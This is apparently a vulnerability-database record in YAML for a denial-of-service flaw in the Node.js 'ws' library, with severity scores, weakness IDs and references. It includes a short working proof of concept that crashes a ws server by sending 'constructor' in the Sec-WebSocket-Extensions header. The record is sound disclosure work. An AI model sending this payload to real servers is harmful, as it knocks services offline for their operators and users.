vulnerability_id: VCID-5yt5-9b1y-aaab
aliases:
  - GHSA-5v72-xg48-5rpm
  - GMS-2019-145
summary: |
  Denial of Service in ws
  Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

  ## Proof of concept

  ```
  const WebSocket = require('ws');
  const net = require('net');

  const wss = new WebSocket.Server({ port: 3000 }, function () {
    const payload = 'constructor';  // or ',;constructor'

    const request = [
      'GET / HTTP/1.1',
      'Connection: Upgrade',
      'Sec-WebSocket-Key: test',
      'Sec-WebSocket-Version: 8',
      `Sec-WebSocket-Extensions: ${payload}`,
      'Upgrade: websocket',
      '\r'
    ].join('\r');

    const socket = net.connect(3000, function () {
      socket.resume();
      socket.write(request);
    });
  });
  ```


  ## Recommendation

  Update to version 3.3.1 or later.
severities:
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-5v72-xg48-5rpm
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://snyk.io/vuln/npm:ws:20171108
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://snyk.io/vuln/npm:ws:20171108
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://www.npmjs.com/advisories/550
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://www.npmjs.com/advisories/550
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://www.npmjs.com/advisories/550/versions
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://www.npmjs.com/advisories/550/versions
weaknesses:
  - CWE-400
  - CWE-937
  - CWE-1035
references:
  - url: https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a
    reference_type:
    reference_id:
  - url: https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407
    reference_type:
    reference_id:
  - url: https://nodesecurity.io/advisories/550
    reference_type:
    reference_id:
  - url: https://snyk.io/vuln/npm:ws:20171108
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/550
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/550/versions
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-5v72-xg48-5rpm
    reference_type:
    reference_id: GHSA-5v72-xg48-5rpm
